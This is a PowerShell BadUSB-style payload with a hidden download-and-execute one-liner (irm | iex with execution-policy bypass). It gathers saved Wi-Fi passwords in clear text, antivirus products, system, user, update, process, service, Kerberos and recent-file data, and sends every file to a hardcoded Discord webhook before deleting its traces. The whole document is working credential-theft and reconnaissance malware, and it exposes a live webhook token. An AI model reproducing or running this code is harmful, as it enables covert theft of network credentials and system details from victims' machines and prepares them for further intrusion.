<#
OneLiner to Invoke Feature_Testing : 

powershell -w h -NoP -Ep Bypass -c "$DiscordUrl='https://discord.com/api/webhooks/1200825365074026656/II57HCGRJAOJmEplqOjdz3xuZC70d2v9aJvU1OfX2BK_c7SQHfk9R9ZZdIf9F_RQ4LFX';$db='';(irm https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/4dv4nc3d_R3c0n/Feature_Testing.ps1) | iex"

#>


# Function to handle the temporary directory
function TempDir {
    # Check if the C:\temp directory exists
    if (Test-Path -Path "C:\temp" -PathType Container) {
        # The folder exists

        # Check if the current directory is C:\temp
        if (-not (Get-Location).Path -eq "C:\temp") {
            # If not, change the directory
            Set-Location -Path "C:\temp"
        }
    } else {
        # The folder does not exist, create it, and change the directory
        New-Item -Path "C:\" -Name "temp" -ItemType Directory
        Set-Location -Path "C:\temp"
    }
}

# Function to delete the temporary directory
function DelTempDir {
    cd C:\
    rmdir -R \temp
    exit
}


function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $DiscordUrl
    }
}

# Créer un scriptblock pour la fonction Exfiltration
function Exfiltration {
    # Get desktop path
    $desktop = [Environment]::GetFolderPath("Desktop")

    # Call version-av function
    version-av

    # Call Wifi function
    Wifi

    # Call SysInfo function
    SysInfo

    #Call SystemInfoGrabbing
    SystemInfoGrabbing
}

    function version-av {
        Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\AntiSpyware.txt -Encoding utf8

        # Upload AntiSpyware.txt to Discord
        Upload-Discord -file "C:\Temp\AntiSpyware.txt" -text "Anti-spyware version:"

        # Return to C:\temp folder
        cd C:\
        rmdir -R \temp
    }

    function Wifi {
        # Crée le dossier temporaire wifi dans C:\temp
        New-Item -Path "C:\temp" -Name "wifi" -ItemType "directory" -Force
        Set-Location -Path "C:\temp\wifi"

        # Exporte les profils Wi-Fi
        netsh wlan export profile key=clear

        # Modifie les chemins dans le fichier et sauvegarde le résultat dans wifi.txt
        Select-String -Path *.xml -Pattern 'keyMaterial' | ForEach-Object {
            $_ -replace '</?keyMaterial>', '' -replace "C:\\Users\\$env:UserName\\Desktop\\", '' -replace '.xml:22:', ''
        } | Out-File -FilePath "wifi.txt" -Encoding utf8

        # Charge le fichier wifi.txt sur Discord
        Upload-Discord -file "wifi.txt" -text "Wifi password :"

        # Retourne au dossier temporaire C:\temp
        Set-Location -Path "C:\temp"

        # Supprime le dossier temporaire wifi
        Remove-Item -Path "C:\temp\wifi" -Force -Recurse
    }

    function SysInfo {
        # Get desktop path
        $desktop = ([Environment]::GetFolderPath("Desktop"))

        # Get user information
        $date = Get-Date -UFormat "%d-%m-%Y_%H-%M-%S"
        $namepc = $env:computername
        $user = $env:UserName
        $userInfo = "Computer Name : $namepc`r`nUser : $user`r`nDate : $date"
        $userInfo | Out-File -FilePath "C:\Temp\UserInfo.txt" -Encoding utf8

        # Get computer information
        Get-ComputerInfo | Out-File -FilePath "C:\Temp\ComputerInfo.txt" -Encoding utf8

        # Generate a report of updates installed on the computer
        $userDir = "C:\Temp"
        $fileSaveDir = New-Item -Path $userDir -ItemType Directory -Force
        $date = Get-Date
        $Report = "Update Report`r`n`r`nGenerated on: $Date`r`n`r`nInstalled Updates:`r`n"

        $UpdatesInfo = Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | Sort-Object -Property InstalledOn -Descending
        foreach ($Update in $UpdatesInfo) {
            $Report += "Description: $($Update.Description)`r`nHotFixId: $($Update.HotFixId)`r`nInstalledOn: $($Update.InstalledOn)`r`nInstalledBy: $($Update.InstalledBy)`r`n`r`n"
        }

        $Report | Out-File -FilePath "$userDir\WinUpdates.txt" -Encoding utf8

        # Upload files to Discord via the Upload-Discord function
        Upload-Discord -file "C:\temp\UserInfo.txt" -text "User Informations :"
        Upload-Discord -file "C:\temp\ComputerInfo.txt" -text "Computer Informations :"
        Upload-Discord -file "C:\temp\WinUpdates.txt" -text "Updates Informations :"
    }

# Function to delete the temporary directory
function DelTempDir {
    cd C:\
    rmdir -R \temp
    Read-Host -Prompt "Appuyez sur Entrée pour continuer..."
}

<#

############################################################################################################################################################
------------------------------------------------------------------------------------------------------------------------------------------------------------
SYSTEM INFO GRABBING PHASE
------------------------------------------------------------------------------------------------------------------------------------------------------------
############################################################################################################################################################

#>
Function SystemInfoGrabbing {
#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Function to retrieve a registry value
Function Get-RegistryValue($key, $value) {  (Get-ItemProperty $key $value).$value }

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Registry key and value names
$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" 
$ConsentPromptBehaviorAdmin_Name = "ConsentPromptBehaviorAdmin" 
$PromptOnSecureDesktop_Name = "PromptOnSecureDesktop" 

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get registry values
$ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key $ConsentPromptBehaviorAdmin_Name 
$PromptOnSecureDesktop_Value = Get-RegistryValue $Key $PromptOnSecureDesktop_Name

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Evaluate UAC settings
If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notify" }
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Notify me only when apps try to make changes to my computer (do not dim my desktop)" } 
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Notify me only when apps try to make changes to my computer (default)" }
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notify" }
Else{ $UAC = "Unknown" } 

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Check if LSASS is running as a protected process
$lsass = Get-Process -Name "lsass"
if ($lsass.ProtectedProcess) {$lsassStatus = "LSASS is running as a protected process."} 
else {$lsassStatus = "LSASS is not running as a protected process."}

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get names of items in the Startup folder
$StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get System Information
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerName = $computerSystem.Name
$computerModel = $computerSystem.Model
$computerManufacturer = $computerSystem.Manufacturer
$computerBIOS = Get-CimInstance CIM_BIOSElement  | Out-String
$computerOs=(Get-WMIObject win32_operatingsystem) | Select Caption, Version  | Out-String
$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List  | Out-String
$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List  | Out-String
$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}  | Out-String
$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get a list of Scheduled Tasks
$ScheduledTasks = Get-ScheduledTask

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get Kerberos ticket information
$klist = klist sessions

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get a list of 50 most recent files in the user's profile
$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get COM & Serial Devices
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table | Out-String -width 250

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get a list of processes
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Out-String -width 250

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get a list of services
$service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName | Out-String -width 250

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get a list of installed software
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -width 250

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get a list of drivers
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String -width 250

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

# Get information about the video card
$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String -width 250

#-----------------------------------------------------------------------------------------------------------------------------------------------------------


# Output to a text file
$outputPath = Join-Path $env:TEMP "SystemInfo.txt"
@(
    "UAC Setting: $UAC",
    "LSASS Status: $lsassStatus",
    "Startup Items: $StartUp",
    "System Information:",
    "    Computer Name: $computerName",
    "    Model: $computerModel",
    "    Manufacturer: $computerManufacturer",
    "    BIOS: $computerBIOS",
    "    OS: $computerOs",
    "    CPU: $computerCpu",
    "    Mainboard: $computerMainboard",
    "    RAM Capacity: $computerRamCapacity",
    "    RAM: $computerRam",
    "Scheduled Tasks: $ScheduledTasks",
    "Kerberos Tickets: $klist",
    "Recent Files: $RecentFiles",
    "COM & Serial Devices: $COMDevices",
    "Processes: $process",
    "Services: $service",
    "Installed Software: $software",
    "Drivers: $drivers",
    "Video Card Information: $videocard"
) | Out-File -FilePath $outputPath

    # Upload to Discord
    Upload-Discord -file $outputPath -text "System information uploaded by $env:username at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
}

#Call Exfiltration
Exfiltration

#Call DelTempDir
DelTempDir
